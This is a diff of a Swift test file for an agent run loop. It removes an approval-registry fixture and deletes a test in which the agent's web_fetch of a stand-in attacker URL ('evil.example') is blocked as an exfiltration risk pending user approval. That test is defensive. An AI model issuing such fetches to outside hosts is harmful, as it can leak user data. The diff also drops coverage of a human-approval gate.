@@ -12,7 +12,6 @@ import Testing
   private struct Fixture {
     let runner: TurnRunner
     let stores: ClawStores
-    let registry: PendingConfirmationRegistry
     let sessionId: Int64
     let runId: Int64
     let triggerMessageId: Int64
@@ -39,7 +38,6 @@ import Testing
         ts: Date()
       )
     )
-    let registry = PendingConfirmationRegistry()
     let agent = AgentRuntime(
       provider: provider,
       typingIndicator: NoopTyping(),
@@ -61,14 +59,12 @@ import Testing
       agent: agent,
       budget: budget,
       contextBuilder: makeEmptyContextBuilder(),
-      pendingConfirmations: registry,
       notifyOutbox: {},
       logger: TestLog.silent
     )
     return Fixture(
       runner: runner,
       stores: stores,
-      registry: registry,
       sessionId: claim.sessionId ?? 0,
       runId: claim.runId ?? 0,
       triggerMessageId: claim.triggerMessageId ?? 0,
@@ -95,8 +91,7 @@ import Testing
       runId: fixture.runId,
       sessionId: fixture.sessionId,
       chatId: 7,
-      triggerMessageId: fixture.triggerMessageId,
-      grant: nil
+      triggerMessageId: fixture.triggerMessageId
     )
 
     // then — reply delivered; exchange rows + taint persisted (REOPEN the DB to assert, §17-1)
@@ -114,71 +109,6 @@ import Testing
     // two usage rows: the intermediate write + the commit-borne final row (D6)
     let totals = try reopened.usage.todayTokensAndCost(now: Date())
     #expect(totals.tokens > 0)
-  }
-
-  @Test func pendingApprovalAppendsPromptAfterReplyAndParks() async throws {
-    // given — the gate trips; the model wraps up (D7)
-    let approval = ToolApprovalRequest(
-      action: ToolAction(tool: "web_fetch", target: "https://evil.example/x?q=1"),
-      reason: .exfilTrifecta
-    )
-    let fixture = try makeFixture(
-      provider: SequenceProvider([
-        toolCallResponse([fetchProposal(url: "https://evil.example/x?q=1")]),
-        okResponse(content: "I wanted to fetch that page because…"),
-      ]),
-      dispatcher: ScriptedDispatcher { call, _ in
-        ToolDispatchOutcome(
-          observation: ToolObservation(
-            callId: call.id,
-            toolName: call.name,
-            content: "BLOCKED_PENDING_APPROVAL",
-            status: .blockedPendingApproval,
-            ingestedUntrusted: false
-          ),
-          argsRedacted: call.argumentsJSON,
-          pendingApproval: approval
-        )
-      }
-    )
-
-    // when
-    try await fixture.runner.run(
-      runId: fixture.runId,
-      sessionId: fixture.sessionId,
-      chatId: 7,
-      triggerMessageId: fixture.triggerMessageId,
-      grant: nil
-    )
-
-    // then — the prompt is APPENDED after the model's explanation (rev.1 L1), full URL included
-    let payload = try #require(try outboxPayloads(fixture).first)
-    let explanationRange = try #require(payload.range(of: "because…"))
-    let promptRange = try #require(payload.range(of: "https://evil.example/x?q=1"))
-    #expect(explanationRange.lowerBound < promptRange.lowerBound)
-    #expect(payload.contains("Reply yes to allow this one fetch"))
-
-    // and the entry is parked; the blocked exchange is persisted history (§9.2 re-proposal
-    // substrate). Decode the `tool_calls` column and match the canonical URL against the decoded
-    // arguments — decode-based matching stays robust regardless of the encoder's escaping policy.
-    #expect(
-      await fixture.registry.pending(sessionId: fixture.sessionId) == .toolApproval(approval)
-    )
-    let snapshot = try fixture.stores.sessionMessages.loadContextSnapshot(
-      sessionId: fixture.sessionId,
-      throughMessageId: Int64.max,
-      limit: 50
-    )
-    #expect(
-      snapshot.history.contains { stored in
-        guard let toolCallsJSON = stored.toolCallsJSON else {
-          return false
-        }
-        return ToolCallCoding.decode(toolCallsJSON).contains { call in
-          call.argumentsJSON.contains("https://evil.example/x?q=1")
-        }
-      }
-    )
   }
 
   @Test func degradedRunPersistsItsExecutedExchanges() async throws {
@@ -203,8 +133,7 @@ import Testing
       runId: fixture.runId,
       sessionId: fixture.sessionId,
       chatId: 7,
-      triggerMessageId: fixture.triggerMessageId,
-      grant: nil
+      triggerMessageId: fixture.triggerMessageId
     )
 
     // then — the run FAILED, yet the anchor + observation rows exist in durable history
@@ -251,8 +180,7 @@ import Testing
       runId: fixture.runId,
       sessionId: fixture.sessionId,
       chatId: 7,
-      triggerMessageId: fixture.triggerMessageId,
-      grant: nil
+      triggerMessageId: fixture.triggerMessageId
     )
 
     // then — the run FAILED with the named-cap reply (`Degradation.budget(cap:)`), and the taint
